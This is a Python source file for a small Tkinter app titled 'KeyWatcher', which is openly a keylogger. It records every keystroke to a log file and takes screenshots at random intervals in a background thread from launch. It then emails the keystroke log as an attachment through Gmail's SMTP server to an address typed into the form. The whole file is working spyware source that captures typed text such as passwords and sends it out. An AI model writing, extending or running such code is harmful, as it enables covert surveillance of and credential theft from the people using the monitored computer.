from pynput.keyboard import Listener as KeyboardListener

import logging
import smtplib
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders
from tkinter import *
from PIL import ImageGrab
from multiprocessing import Process, freeze_support
import datetime
import threading
import os
import numpy as np
import cv2
import random
import time
import pyautogui
from dotenv import load_dotenv



load_dotenv()


EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
root = Tk()
root.title("KeyWatcher")
root.geometry('350x200')

 
log_dir = r"D:/Hacvker/"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
keylogger_running = False
listener = None
mouse_listener = None

current_date= datetime.datetime.now().strftime("%Y-%m-%d")
date_dir = os.path.join(log_dir,current_date)
if not os.path.exists(date_dir):
    os.makedirs(date_dir)



def output_key(key):
    logging.info(f"Key pressed: {key}")



def send_email_with_attachment():
    fromaddr = EMAIL_ADDRESS
    toaddr = recipient_email_entry.get()

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Test"
    body = "Logged files"
    msg.attach(MIMEText(body, 'plain'))
    filename = "keyLog.txt"
    attachment = open("D:/Hacvker/keyLog.txt", "rb")
    p = MIMEBase('application', 'octet-stream') 
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p) 
    s = smtplib.SMTP('smtp.gmail.com', 587) 
    s.starttls()
    s.login(fromaddr, EMAIL_PASSWORD) 
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit() 
 

def start_keylogger():
    global keylogger_running,listener
    if keylogger_running:
        listener.stop()
        listener = None
        toggle_button.config(text="Start Keylogger")
        keylogger_running = False
    else:
        listener = KeyboardListener(on_press=output_key)
        listener.start()
        toggle_button.config(text="Stop Keylogger")
        keylogger_running = True

def take_random_screenshots():
    while True:
        random_time = random.randint(1, 5)
        time.sleep(random_time)
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        file_name = os.path.join(date_dir, f"screenshot_{timestamp}.png")
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(file_name)
        print(f"Screenshot saved as {file_name}")

screenshot_thread = threading.Thread(target=take_random_screenshots, daemon=True)
screenshot_thread.start()

toggle_button = Button(root, text="Start Keylogger", command=start_keylogger)
toggle_button.pack(pady=20)

recipient_label = Label(root, text="Enter recipient email:")
recipient_label.pack()
recipient_email_entry = Entry(root, width=30)
recipient_email_entry.pack(pady=5)

send_button = Button(root, text="Send email", command=send_email_with_attachment)
send_button.pack(pady=20)



root.mainloop()
